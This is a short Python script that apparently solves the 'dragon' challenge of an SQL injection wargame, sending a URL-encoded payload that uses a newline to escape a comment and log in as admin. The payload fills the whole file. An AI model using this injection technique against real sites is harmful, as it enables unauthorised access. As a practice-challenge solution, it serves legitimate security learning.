import requests
from dotenv import load_dotenv
import os

load_dotenv()
url=os.environ.get('LOS_URL')+'chall/dragon_51996aa769df79afbf79eb4d66dbcef6.php?pw=%0aand%20pw%20=%20%273%27%20or%20id=%27admin%27%20%23'
headers = {
    'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
}

res=requests.get(url, headers=headers)
if "DRAGON Clear!" in res.text:
    print("Success")
else:
    print("Failed")
    print(url)
    print(res.text)